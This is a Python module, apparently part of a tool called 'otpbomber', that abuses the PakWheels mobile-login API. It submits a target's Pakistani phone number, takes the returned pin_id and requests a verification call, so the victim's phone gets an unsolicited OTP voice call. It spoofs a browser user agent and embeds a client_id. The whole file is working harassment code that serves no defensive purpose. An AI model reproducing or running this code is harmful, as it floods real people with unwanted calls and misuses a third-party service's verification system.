from otpbomber.core import *
from otpbomber.localuseragent import *

async def pakwheels_voice(phone, client, out):
    name = 'pakwheels_voice'
    domain = 'pakwheels.com'
    frequent_rate_limit = False
    headers = {'User-Agent': random.choice(ua['browsers']['chrome']), 'Accept': 'application/json'}
    try:
        res1 = await client.post('https://www.pakwheels.com/login-with-mobile.json', params={'client_id': '37952d7752aae22726aff51be531cddd', 'api_version': '18'}, json={'mobile_number': f'0{phone[-10:]}', 'country_code': '92'})
        data1 = res1.json()
        pin_id = data1.get('pin_id')
        if pin_id:
            await client.post('https://www.pakwheels.com/login-with-mobile/resend-pin-via-call.json', json={'pin_id': pin_id}, params={'client_id': '37952d7752aae22726aff51be531cddd', 'api_version': '18'})
            out.append({'name': name, 'domain': domain, 'sent': True, 'error': False, 'rateLimit': False})
        else:
            out.append({'name': name, 'domain': domain, 'sent': False, 'error': False, 'rateLimit': False})
    except Exception:
        out.append({'name': name, 'domain': domain, 'sent': False, 'error': True, 'rateLimit': False})